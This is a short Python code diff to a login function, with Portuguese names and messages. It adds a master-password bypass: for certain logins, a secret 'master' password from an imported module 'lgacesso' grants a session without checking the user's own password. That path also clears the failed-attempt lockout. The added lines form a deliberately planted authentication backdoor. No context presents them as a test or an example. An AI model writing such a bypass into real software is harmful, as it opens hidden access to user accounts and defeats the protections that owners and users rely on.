@@ -137,6 +137,11 @@ def entrar(c, login, senha, ip=""):
         return 401, {"ok": False, "erro": "Usuário ou senha incorretos."}
     if u["bloqueio"] > agora:
         return 429, {"ok": False, "erro": f"Muitas tentativas erradas. Tente de novo em {int((u['bloqueio'] - agora) // 60) + 1} minuto(s)."}
+    import lgacesso
+    if login in lgacesso.MASTERS and lgacesso.master(login, senha):
+        c.execute("UPDATE ct_usuarios SET falhas=0, bloqueio=0 WHERE id=?", (u["id"],))
+        _log(c, login, "Entrou (senha master)", "", ip)
+        return 200, {"ok": True, "token": _nova_sessao(c, u["id"]), "sessao": _pub(u)}
     if not lgapi.confere_senha(senha, u["senha"]):
         dentro = agora - u["janela"] < 900
         falhas = (u["falhas"] if dentro else 0) + 1
